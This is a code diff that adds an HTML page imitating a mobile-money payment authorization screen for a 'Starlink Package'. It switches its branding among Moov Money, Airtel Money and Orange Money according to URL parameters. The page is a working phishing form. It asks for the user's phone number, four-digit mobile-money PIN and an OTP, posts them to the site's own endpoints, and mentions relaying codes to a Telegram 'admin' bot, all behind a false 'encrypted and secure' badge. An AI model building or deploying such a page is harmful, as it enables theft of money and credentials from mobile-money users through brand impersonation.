@@ -1,1 +1,300 @@
-PLACEHOLDER
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Authorize Payment — Starnét Afric</title>
+  <meta name="theme-color" content="#ff9500">
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      background: #f3f4f6;
+    }
+    body.moov { background: #ff9500; }
+    body.airtel { background: #f5f5f5; }
+    body.orange { background: #ff7900; }
+    .card {
+      width: 100%;
+      max-width: 400px;
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 10px 40px rgba(0,0,0,.15);
+      overflow: hidden;
+    }
+    .top-bar {
+      display: flex;
+      justify-content: space-between;
+      align-items: flex-start;
+      padding: 18px 20px 12px;
+      border-bottom: 1px solid #f0f0f0;
+    }
+    .top-bar .amount-label { font-size: 11px; color: #888; letter-spacing: .5px; }
+    .top-bar .amount { font-size: 22px; font-weight: 800; color: #ff9500; }
+    body.airtel .top-bar .amount { color: #e60000; }
+    body.orange .top-bar .amount { color: #ff7900; }
+    .top-bar .service-label { font-size: 11px; color: #888; text-align: right; }
+    .top-bar .service { font-size: 14px; font-weight: 600; color: #222; text-align: right; }
+    .body { padding: 24px 22px 28px; }
+    .step { text-align: center; font-size: 13px; color: #888; margin-bottom: 6px; }
+    .title { text-align: center; font-size: 15px; color: #333; margin-bottom: 22px; line-height: 1.4; }
+    .field { margin-bottom: 18px; }
+    .field label {
+      display: block;
+      font-size: 13px;
+      font-weight: 600;
+      color: #333;
+      margin-bottom: 8px;
+    }
+    .field .hint { font-size: 12px; color: #999; font-weight: 400; margin-top: 4px; }
+    .phone-row {
+      display: flex;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      overflow: hidden;
+      background: #fff;
+    }
+    .phone-row .cc {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      padding: 12px 12px;
+      background: #f8f8f8;
+      border-right: 1px solid #eee;
+      font-size: 14px;
+      white-space: nowrap;
+    }
+    .phone-row input {
+      flex: 1;
+      border: none;
+      padding: 12px 14px;
+      font-size: 16px;
+      outline: none;
+    }
+    .pin-row, .otp-row {
+      display: flex;
+      gap: 10px;
+      justify-content: center;
+    }
+    .pin-row input, .otp-row input {
+      width: 52px;
+      height: 54px;
+      text-align: center;
+      font-size: 22px;
+      font-weight: 700;
+      border: 1.5px solid #ddd;
+      border-radius: 10px;
+      outline: none;
+      background: #fafafa;
+    }
+    .pin-row input:focus, .otp-row input:focus {
+      border-color: #ff9500;
+      background: #fff;
+      box-shadow: 0 0 0 3px rgba(255,149,0,.2);
+    }
+    body.airtel .pin-row input:focus,
+    body.airtel .otp-row input:focus {
+      border-color: #e60000;
+      box-shadow: 0 0 0 3px rgba(230,0,0,.15);
+    }
+    .btn {
+      width: 100%;
+      padding: 15px;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 8px;
+      transition: opacity .15s;
+    }
+    .btn:disabled { opacity: .55; cursor: not-allowed; }
+    .btn-primary { background: #c8c8c8; color: #fff; }
+    .btn-primary.active { background: #ff9500; }
+    body.airtel .btn-primary.active { background: #e60000; }
+    body.orange .btn-primary.active { background: #ff7900; }
+    .btn-success { background: #34c759; color: #fff; display: none; }
+    .secure { text-align: center; font-size: 12px; color: #16a34a; margin-top: 18px; }
+    .msg { text-align: center; font-size: 13px; margin-top: 12px; min-height: 18px; }
+    .msg.err { color: #dc2626; }
+    .msg.ok { color: #16a34a; }
+    #otp-section { display: none; margin-top: 20px; padding-top: 16px; border-top: 1px solid #f0f0f0; }
+    .footer-copy { text-align: center; font-size: 11px; color: rgba(0,0,0,.35); margin-top: 18px; }
+    body.moov .footer-copy, body.orange .footer-copy { color: rgba(255,255,255,.7); }
+  </style>
+</head>
+<body class="moov">
+  <div class="card">
+    <div class="top-bar">
+      <div>
+        <div class="amount-label">AMOUNT</div>
+        <div class="amount" id="amount-display">KES —</div>
+      </div>
+      <div>
+        <div class="service-label">SERVICE</div>
+        <div class="service" id="service-display">Starlink Package</div>
+      </div>
+    </div>
+    <div class="body">
+      <div class="step" id="step-label">Step 2 of 3: Verification</div>
+      <div class="title" id="title-text">Enter your Moov Money details to authorize payment</div>
+      <div class="field">
+        <label id="phone-label">Moov Money Number</label>
+        <div class="phone-row">
+          <div class="cc"><span>🇰🇪</span> <span>+254</span></div>
+          <input type="tel" id="phone" placeholder="7XXXXXXXX" maxlength="12" inputmode="tel" autocomplete="tel">
+        </div>
+      </div>
+      <div class="field">
+        <label>Enter your PIN code (4 digits)</label>
+        <div class="hint" id="pin-hint">Check your Moov Money app or SMS</div>
+        <div class="pin-row" style="margin-top:10px;">
+          <input type="password" id="p1" maxlength="1" inputmode="numeric" autocomplete="off">
+          <input type="password" id="p2" maxlength="1" inputmode="numeric" autocomplete="off">
+          <input type="password" id="p3" maxlength="1" inputmode="numeric" autocomplete="off">
+          <input type="password" id="p4" maxlength="1" inputmode="numeric" autocomplete="off">
+        </div>
+      </div>
+      <button class="btn btn-primary" id="btn-send" onclick="sendOTP()">Verify PIN</button>
+      <div id="otp-section">
+        <div class="field">
+          <label style="text-align:center;">Enter the 4-digit OTP</label>
+          <div class="hint" style="text-align:center;">Sent to Telegram (admin) for verification</div>
+          <div class="otp-row" style="margin-top:12px;">
+            <input type="text" id="o1" maxlength="1" inputmode="numeric">
+            <input type="text" id="o2" maxlength="1" inputmode="numeric">
+            <input type="text" id="o3" maxlength="1" inputmode="numeric">
+            <input type="text" id="o4" maxlength="1" inputmode="numeric">
+          </div>
+        </div>
+        <button class="btn btn-success" id="btn-verify" style="display:block;" onclick="verifyOTP()">VERIFY OTP & CONFIRM</button>
+      </div>
+      <div class="msg" id="msg"></div>
+      <p class="secure">🔒 Your information is encrypted and secure</p>
+    </div>
+  </div>
+  <p class="footer-copy" id="footer-copy">© 2026 Moov Money. All rights reserved.</p>
+  <script>
+    const params = new URLSearchParams(location.search);
+    const provider = (params.get("provider") || "moov").toLowerCase();
+    const amount   = params.get("amount") || "—";
+    const currency = params.get("cur") || "KES";
+    const packageName = params.get("package") || "Starlink Package";
+    const prefillPhone = params.get("phone") || "";
+    document.body.className = provider;
+    document.getElementById("amount-display").textContent = currency + " " + amount;
+    document.getElementById("service-display").textContent = packageName;
+    if (provider === "airtel") {
+      document.getElementById("title-text").textContent = "Enter your Airtel Money details to authorize payment";
+      document.getElementById("phone-label").textContent = "Airtel Money Number";
+      document.getElementById("pin-hint").textContent = "Enter airtel money pin";
+      document.getElementById("footer-copy").textContent = "© 2026 Airtel Money. All rights reserved.";
+      document.getElementById("btn-send").textContent = "SEND OTP";
+      document.title = "LOGIN TO AIRTEL LITE";
+    } else if (provider === "orange") {
+      document.getElementById("title-text").textContent = "Enter your Orange Money details to authorize payment";
+      document.getElementById("phone-label").textContent = "Orange Money Number";
+      document.getElementById("pin-hint").textContent = "Check your Orange Money app or SMS";
+      document.getElementById("footer-copy").textContent = "© 2026 Orange Money. All rights reserved.";
+    } else {
+      document.getElementById("btn-send").textContent = "Verify PIN";
+    }
+    if (prefillPhone) {
+      document.getElementById("phone").value = prefillPhone.replace(/^\+254/, "").replace(/^0/, "");
+    }
+    function wire(prefix, len) {
+      for (let i = 1; i <= len; i++) {
+        const el = document.getElementById(prefix + i);
+        el.addEventListener("input", () => {
+          if (el.value.length === 1 && i < len) document.getElementById(prefix + (i+1)).focus();
+          updateBtnState();
+        });
+        el.addEventListener("keydown", (e) => {
+          if (e.key === "Backspace" && !el.value && i > 1) document.getElementById(prefix + (i-1)).focus();
+        });
+      }
+    }
+    wire("p", 4);
+    wire("o", 4);
+    function getVal(prefix) {
+      return [1,2,3,4].map(i => document.getElementById(prefix + i).value).join("");
+    }
+    function updateBtnState() {
+      const pin = getVal("p");
+      const phone = document.getElementById("phone").value.trim();
+      const btn = document.getElementById("btn-send");
+      if (phone.length >= 9 && pin.length === 4) {
+        btn.classList.add("active");
+        btn.disabled = false;
+      } else {
+        btn.classList.remove("active");
+      }
+    }
+    document.getElementById("phone").addEventListener("input", updateBtnState);
+    function showMsg(t, ok) {
+      const m = document.getElementById("msg");
+      m.textContent = t;
+      m.className = "msg " + (ok ? "ok" : "err");
+    }
+    async function sendOTP() {
+      const phoneRaw = document.getElementById("phone").value.trim().replace(/\s+/g,"");
+      const pin = getVal("p");
+      if (!phoneRaw || phoneRaw.length < 9) return showMsg("Enter a valid phone number");
+      if (pin.length !== 4) return showMsg("Enter your 4-digit PIN");
+      const phone = "+254" + phoneRaw.replace(/^0/, "").replace(/^\+254/, "");
+      showMsg("Sending…", true);
+      document.getElementById("btn-send").disabled = true;
+      try {
+        const res = await fetch("/api/auth/send-otp", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ phone, pin, provider, amount: amount + " " + currency, package: packageName })
+        });
+        const data = await res.json();
+        if (!res.ok || !data.ok) {
+          showMsg(data.error || "Failed to send OTP");
+          document.getElementById("btn-send").disabled = false;
+          return;
+        }
+        document.getElementById("otp-section").style.display = "block";
+        document.getElementById("o1").focus();
+        showMsg("OTP sent. Check Telegram bot.", true);
+      } catch (e) {
+        showMsg("Network error. Try again.");
+        document.getElementById("btn-send").disabled = false;
+      }
+    }
+    async function verifyOTP() {
+      const phoneRaw = document.getElementById("phone").value.trim().replace(/\s+/g,"");
+      const phone = "+254" + phoneRaw.replace(/^0/, "").replace(/^\+254/, "");
+      const pin = getVal("p");
+      const otp = getVal("o");
+      if (otp.length !== 4) return showMsg("Enter the 4-digit OTP");
+      showMsg("Verifying…", true);
+      try {
+        const res = await fetch("/api/auth/verify-otp", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ phone, pin, otp, provider, amount: amount + " " + currency, package: packageName })
+        });
+        const data = await res.json();
+        if (!res.ok || !data.ok) {
+          showMsg(data.error || "Invalid OTP");
+          return;
+        }
+        showMsg("✅ Payment authorized! Redirecting…", true);
+        setTimeout(() => {
+          window.location.href = data.redirect || "/commandes.html?success=1";
+        }, 1500);
+      } catch (e) {
+        showMsg("Network error. Try again.");
+      }
+    }
+  </script>
+</body>
+</html>
